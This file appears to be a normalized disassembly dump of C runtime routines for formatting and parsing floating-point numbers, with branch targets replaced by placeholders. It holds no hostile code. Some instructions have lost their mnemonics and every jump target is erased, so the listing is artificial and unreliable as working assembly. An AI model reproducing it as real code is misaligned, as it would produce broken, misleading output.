push 0xe
call sub_4ca1c0
pop ecx
mov al [ eax ]
mov [ ebp - 0xa ] al
cmp [ ebp + 0xc ] 0x28
jle r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov cl [ ebp + 0x14 ]
and cl 0xdf
mov [ ebp - 0x9 ] cl
cmp cl 0x46
jne r-xdata
mov [ ebp + 0xc ] 0x28
mov edi [ ebp - 0x8 ]
test edi edi
jg r-xdata
mov edi [ ebp - 0x8 ]
neg edi
test edi edi
jle r-xdata
cmp [ ebp - 0x9 ] 0x45
jne r-xdata
mov edi 0x1
jmp r-xdata
mov eax [ ebp + 0x1c ]
push eax
lea edx [ ebp - 0x38 ]
push edx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_4ce1ec
add esp 0x14
mov esi eax
mov ebx [ ebp + 0x10 ]
cmp esi 0x7fff
jne r-xdata
xor eax eax
mov edi eax
mov [ ebp + 0xc ] eax
jmp r-xdata
inc edi
inc [ ebp + 0xc ]
cmp esi 0x7ffe
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax rw-data
mov eax rw-data
jmp r-xdata
cmp [ ebp - 0x9 ] 0x46
je r-xdata
mov [ ebx ] 0x2d
inc ebx
mov eax rw-data
mov eax rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi eax
xor eax eax
or ecx 0xffffffff
mov esi ebx
[ edi ]
not ecx
sub edi ecx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
cmp esi 0x28
jg r-xdata
cmp [ ebp - 0x9 ] 0x47
jne r-xdata
mov edi eax
xor eax eax
or ecx 0xffffffff
mov esi ebx
[ edi ]
not ecx
sub edi ecx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov dl [ eax ]
inc eax
mov [ ebx ] dl
inc ebx
mov dl [ eax ]
inc eax
test dl dl
je r-xdata
test esi esi
jg r-xdata
cmp esi 0xfffffffd
jl r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov cl [ ebp - 0xa ]
mov [ ebx ] cl
inc ebx
test dl dl
je r-xdata
xor edi edi
lea eax [ ebp - 0x38 ]
jmp r-xdata
mov [ ebx ] 0x30
inc ebx
mov dl [ ebp - 0xa ]
mov [ ebx ] dl
inc ebx
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov dl [ ebp + 0x14 ]
and dl 0x20
or dl 0x45
mov [ ebx ] dl
inc ebx
dec esi
jns r-xdata
mov al [ ebp - 0xa ]
mov [ ebx ] al
inc ebx
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov [ ebx ] dl
inc ebx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov dl [ eax ]
test dl dl
jne r-xdata
mov [ ebx ] 0x30
inc ebx
inc esi
test esi esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax 0x1
jmp r-xdata
mov [ ebx ] 0x2b
inc ebx
neg esi
mov [ ebx ] 0x2d
inc ebx
jmp r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov cl [ ebp + 0x14 ]
push ecx
call sub_4cd1b8
add esp 0xc
mov ebx eax
jmp r-xdata
mov [ ebx ] dl
inc ebx
dec esi
jne r-xdata
add edi [ ebp - 0x8 ]
cmp edi [ ebp + 0xc ]
jge r-xdata
cmp esi eax
jg r-xdata
cmp esi 0x64
jl r-xdata
mov edi 0x4
jmp r-xdata
cmp esi 0x3e8
jl r-xdata
inc eax
mov dl [ ebp - 0xa ]
mov [ ebx ] dl
inc ebx
inc edi
dec esi
je r-xdata
mov ecx [ ebp + 0xc ]
sub ecx edi
mov edi ecx
add esi edi
push edi
push 0x30
push ebx
call sub_4c4d44
add esp 0xc
add ebx edi
dec esi
je r-xdata
mov edi 0x2
mov edi 0x3
jmp r-xdata
mov [ ebx + edi ] 0x0
lea eax [ ebx + edi ]
mov ebx eax
test edi edi
je r-xdata
cmp ebx [ ebp + 0x10 ]
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax esi
mov ecx 0xa
cdq
idiv ecx
dec ebx
add dl 0x30
mov eax esi
mov ecx 0xa
mov [ ebx ] dl
dec edi
cdq
idiv ecx
mov esi eax
test edi edi
jne r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ ebx ] 0x30
inc ebx
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov dl [ ebp + 0x14 ]
push edx
call sub_4cd1b8
add esp 0xc
mov ebx eax
sub_4cd4b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push 0xe
call sub_4ca1c0
pop ecx
cmp di 0x47
je r-xdata
cmp [ ebx - 0x2 ] 0x30
je r-xdata
cmp di 0x67
jne r-xdata
sub ebx 0x2
cmp esi ebx
jb r-xdata
mov dx [ eax ]
cmp dx [ ebx - 0x2 ]
jne r-xdata
jmp r-xdata
mov eax esi
jmp r-xdata
mov eax ebx
sub ebx 0x2
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4cd500
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
push 0xe
call sub_4ca1c0
mov ax [ eax ]
pop ecx
mov [ ebp - 0xc ] ax
cmp [ ebp + 0xc ] 0x28
jle r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov cx [ ebp + 0x14 ]
and cx 0xdf
mov [ ebp - 0xa ] cx
cmp cx 0x46
jne r-xdata
mov [ ebp + 0xc ] 0x28
mov edi [ ebp - 0x8 ]
test edi edi
jg r-xdata
mov edi [ ebp - 0x8 ]
neg edi
test edi edi
jle r-xdata
cmp [ ebp - 0xa ] 0x45
jne r-xdata
mov edi 0x1
jmp r-xdata
mov eax [ ebp + 0x1c ]
push eax
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_4ce4c0
add esp 0x14
mov esi eax
mov ebx [ ebp + 0x10 ]
cmp esi 0x7fff
jne r-xdata
xor eax eax
mov edi eax
mov [ ebp + 0xc ] eax
jmp r-xdata
inc edi
inc [ ebp + 0xc ]
cmp esi 0x7ffe
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax rw-data
mov eax rw-data
jmp r-xdata
cmp [ ebp - 0xa ] 0x46
je r-xdata
mov [ ebx ] 0x2d
add ebx 0x2
mov edx rw-data
mov edx rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
push ebx
call sub_4c513c
add esp 0x8
jmp r-xdata
cmp esi 0x28
jg r-xdata
cmp [ ebp - 0xa ] 0x47
jne r-xdata
push edx
push ebx
call sub_4c513c
add esp 0x8
jmp r-xdata
lea eax [ ebp - 0x64 ]
mov dx [ eax ]
add eax 0x2
mov [ ebx ] dx
add ebx 0x2
mov dx [ eax ]
add eax 0x2
test dx dx
je r-xdata
test esi esi
jg r-xdata
cmp esi 0xfffffffd
jl r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov cx [ ebp - 0xc ]
mov [ ebx ] cx
add ebx 0x2
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x64 ]
jmp r-xdata
mov [ ebx ] 0x30
add ebx 0x2
mov dx [ ebp - 0xc ]
mov [ ebx ] dx
add ebx 0x2
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov dx [ ebp + 0x14 ]
and dx 0x20
or dx 0x45
mov [ ebx ] dx
add ebx 0x2
dec esi
jns r-xdata
mov ax [ ebp - 0xc ]
mov [ ebx ] ax
add ebx 0x2
test dx dx
jne r-xdata
mov dx [ eax ]
test dx dx
jne r-xdata
mov [ ebx ] 0x30
add ebx 0x2
inc esi
test esi esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax 0x1
jmp r-xdata
mov [ ebx ] 0x2b
add ebx 0x2
neg esi
mov [ ebx ] 0x2d
add ebx 0x2
jmp r-xdata
mov [ ebx ] dx
add ebx 0x2
mov dx [ eax ]
add eax 0x2
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov [ ebx ] dx
add ebx 0x2
dec esi
jne r-xdata
add edi [ ebp - 0x8 ]
cmp edi [ ebp + 0xc ]
jge r-xdata
cmp esi eax
jg r-xdata
cmp esi 0x64
jl r-xdata
mov edi 0x4
jmp r-xdata
cmp esi 0x3e8
jl r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov cx [ ebp + 0x14 ]
push ecx
call sub_4cd4b4
add esp 0xc
mov ebx eax
jmp r-xdata
add eax 0x2
mov dx [ ebp - 0xc ]
mov [ ebx ] dx
add ebx 0x2
inc edi
dec esi
je r-xdata
mov ecx [ ebp + 0xc ]
sub ecx edi
mov edi ecx
add esi edi
push edi
push 0x30
push ebx
call sub_4c4d44
add esp 0xc
add edi edi
add ebx edi
dec esi
je r-xdata
mov edi 0x2
mov edi 0x3
jmp r-xdata
mov [ ebx + edi * 2 ] 0x0
lea eax [ ebx + edi * 2 ]
mov ebx eax
test edi edi
je r-xdata
cmp ebx [ ebp + 0x10 ]
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax esi
mov ecx 0xa
cdq
idiv ecx
add dx 0x30
add ebx 0xfffffffe
mov eax esi
mov ecx 0xa
mov [ ebx ] dx
dec edi
cdq
idiv ecx
mov esi eax
test edi edi
jne r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ ebx ] 0x30
add ebx 0x2
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov dx [ ebp + 0x14 ]
push edx
call sub_4cd4b4
add esp 0xc
mov ebx eax
sub_4cd7e8
push ebp
mov ebp esp
lea esp [ ebp - 0x2 ]
fwait
fnstcw [ ebp - 0x2 ]
mov ax 0xf3ff
fwait
mov dx [ ebp - 0x2 ]
and ax dx
or ah ch
mov [ ebp - 0x2 ] ax
fldcw [ ebp - 0x2 ]
frndint
mov [ ebp - 0x2 ] dx
fldcw [ ebp - 0x2 ]
mov esp ebp
pop ebp
retn
sub_4cd814
push ebp
mov ebp esp
add esp 0xffffffbc
xor eax eax
xor edx edx
lea ecx [ ebp - 0x24 ]
push ebx
push esi
push edi
lea edi [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x8000
mov [ ebp - 0x8 ] 0x13
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0xa ] 0x1
mov [ ebp - 0xb ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0x14 ] eax
mov esi 0xfffffffe
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
mov [ ebp - 0x34 ] ecx
push 0xe
call sub_4ca1c0
pop ecx
mov al [ eax ]
mov [ ebp - 0x3d ] al
test bl 0x80
jne r-xdata
mov [ ebp - 0x18 ] 0xffffffff
jmp r-xdata
dec [ ebp + 0x18 ]
js r-xdata
push ebx
call sub_4ce904
pop ecx
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov ebx 0x65
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
cmp esi 0xfffffffe
je r-xdata
cmp ebx 0x2d
jne r-xdata
mov [ ebp - 0xb ] 0x1
jmp r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
inc eax
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp [ ebp - 0xa ] 0x1
jne r-xdata
mov dl 0x1
mov [ ebp - 0xb ] dl
mov [ ebp - 0x9 ] dl
dec [ ebp + 0x18 ]
js r-xdata
mov edx [ ebp + 0x1c ]
mov ecx [ ebp - 0x14 ]
add [ edx ] ecx
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov [ ecx ] eax
mov eax [ ebp - 0x20 ]
mov [ ecx + 0x4 ] eax
mov ax [ ebp - 0x1c ]
mov [ ecx + 0x8 ] ax
jmp r-xdata
fld [ ebp - 0x24 ]
fchs
fstp [ ebp - 0x24 ]
fwait
xor edi edi
cmp ebx 0x65
je r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xa ] 0x0
movsx eax [ ebp - 0x3d ]
cmp ebx eax
jne r-xdata
cmp [ ebp - 0xb ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x44 ] 0x1
cmp ebx 0x45
jne r-xdata
cmp ebx 0x30
jl r-xdata
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp ebx 0x49
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
cmp ebx 0x39
jg r-xdata
test esi esi
jle r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x4e
je r-xdata
test esi esi
jge r-xdata
neg edi
neg [ ebp - 0xd ]
cmp ebx 0x30
jl r-xdata
xor eax eax
cmp ebx 0x2d
mov [ ebp - 0x44 ] eax
jne r-xdata
sub ebx 0x30
inc esi
test esi esi
jg r-xdata
xor edx edx
mov edx esi
jmp r-xdata
cmp ebx 0x4e
jne r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
jmp r-xdata
cmp ebx 0x39
jg r-xdata
cmp ebx 0x2b
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp esi 0x9
jg r-xdata
mov eax [ ebp - 0x34 ]
test ebx ebx
mov [ eax ] bx
je r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x41
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
add edx edx
lea edx [ edx + edx * 4 ]
add ebx edx
add ebx 0xffffffd0
mov edi ebx
cmp ebx 0x1344
jle r-xdata
dec [ ebp + 0x18 ]
js r-xdata
cmp esi [ ebp - 0x8 ]
jg r-xdata
mov eax [ edi ]
add eax eax
lea eax [ eax + eax * 4 ]
add eax ebx
mov [ edi ] eax
jmp r-xdata
or esi 0xffffffff
cmp [ ebp - 0x4 ] 0x8000
je r-xdata
mov esi 0x1
jmp r-xdata
cmp ebx 0x46
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
mov edx esi
mov edx [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
mov ecx [ ebp - 0x34 ]
mov ax 0xffff
mov [ ecx + 0x6 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x4 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x2 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx ] ax
mov ecx [ ebp - 0x34 ]
mov [ ecx + 0x8 ] 0x7ffe
jmp r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov edx [ edi ]
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x38 ] ecx
push ebx
push eax
call sub_4cd188
add esp 0x8
test eax eax
je r-xdata
dec [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp ebx 0x4e
jne r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x24 ]
sub eax edx
push ecx
add edi eax
call sub_4cccd0
pop ecx
fstp [ ebp - 0x24 ]
fwait
test edi edi
je r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov [ edi ] ecx
mov eax [ ebp - 0x38 ]
mov [ edi + 0x4 ] eax
jmp r-xdata
lea edx [ esi - 0x1 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov ecx rw-data
mov eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov ax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov eax rw-data
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax edi
neg eax
mov eax edi
jmp r-xdata
mov ecx rw-data
mov eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov ax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov eax rw-data
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fmulp st1
fstp [ ebp - 0x24 ]
fwait
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fdivp st1
fstp [ ebp - 0x24 ]
fwait
jmp r-xdata
push eax
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x30 ]
fwait
test edi edi
jge r-xdata
sub_4cdc68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x8
je r-xdata
push [ rw-data ]
push [ rw-data ]
mov dx [ ebx + 0x8 ]
push edx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x1
call sub_4ccec4
add esp 0x18
fstp [ esi ]
fwait
jmp r-xdata
mov eax rw-data
fld [ eax ]
fstp [ ebp - 0x8 ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov cx [ ebx + 0x8 ]
push ecx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x0
call sub_4ccec4
add esp 0x18
fstp [ esi ]
fwait
mov ecx [ ebx ]
mov [ esi ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov cx [ ebx + 0x8 ]
mov [ esi + 0x8 ] cx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4cdd00
push ebp
mov ebp esp
add esp 0xffffffbc
xor eax eax
xor edx edx
lea ecx [ ebp - 0x24 ]
push ebx
push esi
push edi
lea edi [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x8000
mov [ ebp - 0x8 ] 0x13
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0xa ] 0x1
mov [ ebp - 0xb ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0x14 ] eax
mov esi 0xfffffffe
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
mov [ ebp - 0x34 ] ecx
push 0xe
call sub_4ca1c0
mov ax [ eax ]
pop ecx
mov [ ebp - 0x3e ] ax
push ebx
call sub_4ca3dc
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x18 ] 0xffffffff
jmp r-xdata
dec [ ebp + 0x18 ]
js r-xdata
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov ebx 0x65
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
inc eax
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
cmp esi 0xfffffffe
je r-xdata
cmp ebx 0x2d
jne r-xdata
mov [ ebp - 0xb ] 0x1
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp [ ebp - 0xa ] 0x1
jne r-xdata
mov dl 0x1
mov [ ebp - 0xb ] dl
mov [ ebp - 0x9 ] dl
dec [ ebp + 0x18 ]
js r-xdata
mov edx [ ebp + 0x1c ]
mov ecx [ ebp - 0x14 ]
add [ edx ] ecx
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov [ ecx ] eax
mov eax [ ebp - 0x20 ]
mov [ ecx + 0x4 ] eax
mov ax [ ebp - 0x1c ]
mov [ ecx + 0x8 ] ax
jmp r-xdata
fld [ ebp - 0x24 ]
fchs
fstp [ ebp - 0x24 ]
fwait
xor edi edi
cmp ebx 0x65
je r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xa ] 0x0
movzx eax [ ebp - 0x3e ]
cmp ebx eax
jne r-xdata
cmp [ ebp - 0xb ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x44 ] 0x1
cmp ebx 0x45
jne r-xdata
cmp ebx 0x30
jl r-xdata
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp ebx 0x49
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
cmp ebx 0x39
jg r-xdata
test esi esi
jle r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x4e
je r-xdata
test esi esi
jge r-xdata
neg edi
neg [ ebp - 0xd ]
cmp ebx 0x30
jl r-xdata
xor eax eax
cmp ebx 0x2d
mov [ ebp - 0x44 ] eax
jne r-xdata
sub ebx 0x30
inc esi
test esi esi
jg r-xdata
xor edx edx
mov edx esi
jmp r-xdata
cmp ebx 0x4e
jne r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
jmp r-xdata
cmp ebx 0x39
jg r-xdata
cmp ebx 0x2b
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp esi 0x9
jg r-xdata
mov eax [ ebp - 0x34 ]
test ebx ebx
mov [ eax ] bx
je r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x41
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
add edx edx
lea edx [ edx + edx * 4 ]
add ebx edx
add ebx 0xffffffd0
mov edi ebx
cmp ebx 0x1344
jle r-xdata
dec [ ebp + 0x18 ]
js r-xdata
cmp esi [ ebp - 0x8 ]
jg r-xdata
mov eax [ edi ]
add eax eax
lea eax [ eax + eax * 4 ]
add eax ebx
mov [ edi ] eax
jmp r-xdata
or esi 0xffffffff
cmp [ ebp - 0x4 ] 0x8000
je r-xdata
mov esi 0x1
jmp r-xdata
cmp ebx 0x46
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
mov edx esi
mov edx [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
mov ecx [ ebp - 0x34 ]
mov ax 0xffff
mov [ ecx + 0x6 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x4 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x2 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx ] ax
mov ecx [ ebp - 0x34 ]
mov [ ecx + 0x8 ] 0x7ffe
jmp r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov edx [ edi ]
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x38 ] ecx
push ebx
push eax
call sub_4cd188
add esp 0x8
test eax eax
je r-xdata
dec [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp ebx 0x4e
jne r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x24 ]
sub eax edx
push ecx
add edi eax
call sub_4cccd0
pop ecx
fstp [ ebp - 0x24 ]
fwait
test edi edi
je r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov [ edi ] ecx
mov eax [ ebp - 0x38 ]
mov [ edi + 0x4 ] eax
jmp r-xdata
lea edx [ esi - 0x1 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov ecx rw-data
mov eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov ax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov eax rw-data
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax edi
neg eax
mov eax edi
jmp r-xdata
mov ecx rw-data
mov eax [ ecx ]
mov [ ebp - 0x24 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov ax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov eax rw-data
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fmulp st1
fstp [ ebp - 0x24 ]
fwait
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fdivp st1
fstp [ ebp - 0x24 ]
fwait
jmp r-xdata
push eax
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x30 ]
fwait
test edi edi
jge r-xdata
sub_4ce154
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
